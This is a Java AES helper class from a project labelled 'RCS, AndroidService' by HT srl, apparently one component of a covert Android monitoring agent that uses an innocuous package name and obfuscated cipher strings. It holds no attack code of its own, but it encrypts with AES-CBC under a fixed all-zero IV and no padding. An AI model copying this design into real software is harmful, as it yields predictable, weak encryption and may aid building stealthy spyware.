/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Crypto.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.crypto;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

// TODO: Auto-generated Javadoc
/**
 * http://www.androidsnippets.org/snippets/39/index.html
 * 
 * @author zeno
 * 
 */
public class Crypto {

	/** The Constant TAG. */
	private static final String TAG = "Crypto"; //$NON-NLS-1$

	/** The aes_key. */
	private final byte[] aes_key;

	/** The skey_spec. */
	private final SecretKeySpec skey_spec;

	/** The iv spec. */
	private final IvParameterSpec ivSpec;

	/** The cipher. */
	Cipher cipher;

	/**
	 * Instantiates a new crypto.
	 * 
	 * @param key
	 *            the key
	 * @throws NoSuchAlgorithmException
	 *             the no such algorithm exception
	 * @throws NoSuchPaddingException
	 *             the no such padding exception
	 */
	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException {
		aes_key = new byte[key.length];
		System.arraycopy(key, 0, aes_key, 0, key.length);
		// 17.0=AES
		skey_spec = new SecretKeySpec(aes_key, Messages.getString("17.0")); //$NON-NLS-1$

		final byte[] iv = new byte[16];

		for (int i = 0; i < 16; i++) {
			iv[i] = 0;
		}

		ivSpec = new IvParameterSpec(iv);
		// 17.1=AES/CBC/NoPadding
		cipher = Cipher.getInstance(Messages.getString("17.1")); //$NON-NLS-1$
	}

	/**
	 * Encrypt.
	 * 
	 * @param clear
	 *            the clear
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] encrypt(final byte[] clear) throws Exception {

		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
		final byte[] encrypted = cipher.doFinal(clear);
		return encrypted;
	}

	public byte[] encrypt(byte[] plain, int offset) throws IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
		final byte[] encrypted = cipher.doFinal(plain, offset, plain.length - offset);
		return encrypted;
	}

	/**
	 * Decrypt.
	 * 
	 * @param encrypted
	 *            the encrypted
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] decrypt(final byte[] encrypted) throws Exception {
		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
		final byte[] decrypted = cipher.doFinal(encrypted);
		return decrypted;
	}

	/**
	 * Decrypt.
	 * 
	 * @param encrypted
	 *            the encrypted
	 * @param offset
	 *            the offset
	 * @param offset2 
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] decrypt(final byte[] encrypted, final int plainlen, int offset) throws Exception {
		if (offset < 0 || encrypted.length < offset) {
			return null;
		}

		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
		byte[] plain= cipher.doFinal(encrypted, offset, encrypted.length - offset );
		byte[] dst = new byte[plainlen];
		System.arraycopy(plain, 0, dst, 0, plainlen);
		return dst;
		
	}

}
